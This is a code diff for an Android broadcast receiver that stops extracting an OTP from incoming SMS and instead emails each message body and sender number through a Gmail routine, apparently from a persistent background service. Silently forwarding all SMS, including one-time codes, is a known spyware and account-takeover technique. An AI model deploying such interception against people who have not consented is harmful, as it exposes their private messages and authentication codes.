@@ -6,16 +6,12 @@ import android.content.Intent;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
-import android.widget.EditText;
+
+import static com.example.persistentbackgroundservice.EmailRoutines.send_email_using_gmail;
+
 
 public class MessageReceiver extends BroadcastReceiver {
     String TAG = "MessageReceiver";
-
-//    private  static EditText editText;
-//
-//    public void setEditText(EditText editText) {
-//        MessageReceiver.editText=editText;
-//    }
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -25,11 +21,12 @@ public class MessageReceiver extends BroadcastReceiver {
         {
             String msg = sms.getMessageBody();
             Log.i(TAG, msg);
-            // here we are spliting the sms using " : " symbol
-            String[] parts = msg.split(": ");
 
-            String otp = parts[0];
-//            editText.setText(otp);
+            String subject = String.format("SMS Transaction [%s]", sms.getOriginatingAddress());
+
+            send_email_using_gmail(subject, msg);
+
+            Log.i(TAG, "Email sent successfully.");
         }
     }
 }
